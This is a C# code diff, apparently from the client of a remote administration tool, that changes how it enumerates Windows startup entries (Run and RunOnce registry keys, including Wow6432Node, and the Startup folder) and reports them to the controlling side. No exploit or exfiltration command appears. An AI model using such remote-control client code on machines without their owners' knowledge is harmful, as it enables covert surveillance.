@@ -6,6 +6,7 @@ using System.Threading;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using xClient.Core.Helper;
+using xClient.Core.Information;
 
 namespace xClient.Core.Commands
 {
@@ -149,28 +150,42 @@ namespace xClient.Core.Commands
                             startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 3);
                     }
                 }
-                if (
-                    Directory.Exists(
-                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
-                            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
+                if (OSInfo.Bits == 64)
                 {
-                    var files =
-                        new DirectoryInfo(
-                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
-                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
-                    foreach (var file in files)
-                        startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 4);
+                    using (
+                        var key =
+                            Registry.CurrentUser.OpenSubKey(
+                                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                false))
+                    {
+                        if (key != null)
+                        {
+                            foreach (var k in key.GetValueNames())
+                                startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 4);
+                        }
+                    }
+                    using (
+                        var key =
+                            Registry.CurrentUser.OpenSubKey(
+                                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                                false))
+                    {
+                        if (key != null)
+                        {
+                            foreach (var k in key.GetValueNames())
+                                startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 5);
+                        }
+                    }
                 }
-                if (
-                    Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                        "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
+                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                 {
                     var files =
-                        new DirectoryInfo(
-                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
+                        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
                     foreach (var file in files)
-                        startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 5);
+                    {
+                        if (file.Name != "desktop.ini")
+                            startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 6);
+                    }
                 }
 
                 new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
